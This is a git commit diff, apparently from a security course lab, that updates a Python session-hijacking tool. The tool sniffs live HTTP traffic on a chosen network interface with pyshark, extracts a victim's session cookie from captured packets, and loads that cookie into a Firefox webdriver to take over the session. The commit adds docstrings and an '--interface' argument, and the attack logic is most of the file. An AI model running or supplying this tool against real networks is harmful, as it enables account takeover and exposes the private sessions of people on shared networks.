4bad70f19dfc1382f76065a18cf6063df7443641
Pawel Rubin <pawelrubin19@gmail.com>
2019-10-27 00:10:23 +0200

    hijack_session.py update * docstrings * command line arguments

--- l02/hijack_session.py
+++ l02/hijack_session.py
@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
 # Paweł Rubin 2019
 #
+"""Session hijacking tool."""
 from typing import List
+from argparse import ArgumentParser
 
 import pyshark
 from selenium import webdriver
 
 
 def parse_cookies(cookies: str) -> List[dict]:
+    """Returns list of cookies in form {"name": <cookie_name>, "value": <cookie_value>}"""
     return [
         {"name": cookie[0], "value": cookie[1]}
         for cookie in [cookie.split("=") for cookie in cookies.split("; ")]
@@ -19,6 +22,8 @@ class SessionCookieNotFoundError(Exception):
 
 
 def get_session_cookie(cookies: str) -> dict:
+    """Return session cookie from http.cookies.
+    Raises SessionCookieNotFoundError"""
     try:
         return next(
             cookie
@@ -30,6 +35,8 @@ def get_session_cookie(cookies: str) -> dict:
 
 
 def hijack_session(interface):
+    """Listens on given interface until session cookie has been found.
+    Opens Firefox webdriver with the cookie."""
     capture = pyshark.LiveCapture(
         interface=interface, display_filter="http.cookie || http.cookie_pair"
     )
@@ -46,6 +53,20 @@ def hijack_session(interface):
         except (AttributeError, SessionCookieNotFoundError):
             continue
 
+def parse_cli():
+    """Parses command line arguments."""
+    parser = ArgumentParser()
+
+    parser.add_argument(
+        "--interface",
+        "-i",
+        type=str,
+        required=True,
+        help="Network interface name.",
+    )
+
+    return parser.parse_args()
 
 if __name__ == "__main__":
-    hijack_session("wlan0mon")
+    args = parse_cli()
+    hijack_session(args.interface)
